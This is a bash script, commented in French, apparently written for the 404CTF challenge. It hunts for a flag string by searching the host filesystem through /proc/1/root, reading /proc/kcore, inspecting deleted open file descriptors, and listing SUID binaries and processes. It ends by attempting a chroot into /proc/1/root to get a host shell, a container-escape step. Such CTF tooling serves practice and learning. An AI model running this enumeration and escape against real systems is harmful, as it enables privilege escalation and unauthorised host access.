#!/bin/bash

echo "🚀 404CTF - SCRIPT D'AUDIT ET DE DÉTECTION DE FLAG COMPLET"
echo "---------------------------------------------------------"

# Étape 1 : recherche de flag explicite
echo -e "\n[1/8] 🔍 Recherche brute de flag dans fichiers ASCII, .sh, .txt, ELF, et mémoire"
find /proc/1/root -type f 2>/dev/null | while read -r f; do
    if file "$f" | grep -q "ASCII"; then
        grep -a "404CTF" "$f" 2>/dev/null && echo "[+] Trouvé dans $f" && exit 0
    fi
done

find /proc/1/root -type f \( -iname "*.sh" -o -iname "*.txt" \) 2>/dev/null | while read -r f; do
    grep -a "404CTF" "$f" 2>/dev/null && echo "[+] Trouvé dans $f" && exit 0
done

find /proc/1/root -type f 2>/dev/null | while read -r f; do
    if file "$f" | grep -q "ELF"; then
        strings "$f" 2>/dev/null | grep -a "404CTF" && echo "[+] Trouvé dans $f" && exit 0
    fi
done

if [ -e /proc/kcore ]; then
    strings /proc/kcore 2>/dev/null | grep -a "404CTF" && echo "[+] Trouvé dans kcore" && exit 0
fi

# Étape 2 : fichiers supprimés encore ouverts
echo -e "\n[2/8] 🧪 Recherche de fichiers supprimés en mémoire"
for f in /proc/1/fd/*; do
  target=$(readlink "$f" 2>/dev/null)
  if [[ "$target" == *"(deleted)"* ]]; then
    echo "[+] Fichier supprimé ouvert : $f -> $target"
    strings "$f" 2>/dev/null | grep -a "404CTF" && exit 0
  fi
done

# Étape 3 : fichiers SUID
echo -e "\n[3/8] 🧱 Fichiers SUID dans /proc/1/root"
find /proc/1/root -type f -perm -4000 2>/dev/null

# Étape 4 : analyse des binaires ELF potentiellement exploitables
echo -e "\n[4/8] ⚙️ Liste des binaires ELF exécutables dans /proc/1/root"
find /proc/1/root -type f -executable 2>/dev/null | while read f; do
    file "$f" | grep ELF
done

# Étape 5 : scripts ou fichiers contenant "flag", "ctf", "404"
echo -e "\n[5/8] 🔎 Recherche de noms suspects (flag, ctf, 404)"
find /proc/1/root -iname "*flag*" -o -iname "*ctf*" -o -iname "*404*" 2>/dev/null

# Étape 6 : exploration de processus actifs
echo -e "\n[6/8] 🧠 Processus actifs"
ps -ef || echo "ps non disponible"

# Étape 7 : exploration des exécutions actives
echo -e "\n[7/8] 🔎 /proc/*/exe symboliques"
ls -l /proc/*/exe 2>/dev/null | grep -v "/exe -> /" | grep -v denied

# Étape 8 : tentative de chroot pour shell root
echo -e "\n[8/8] 🧪 Tentative de chroot dans /proc/1/root"
if [ -x /proc/1/root/bin/bash ]; then
  echo "[+] bash trouvé, ouverture d’un shell chrooté dans le host..."
  chroot /proc/1/root /bin/bash
else
  echo "[-] Aucun /bin/bash exécutable dans /proc/1/root"
fi

echo -e "\n✅ Script terminé. Si rien trouvé, c’est que le flag est bien caché ou à déclencher."
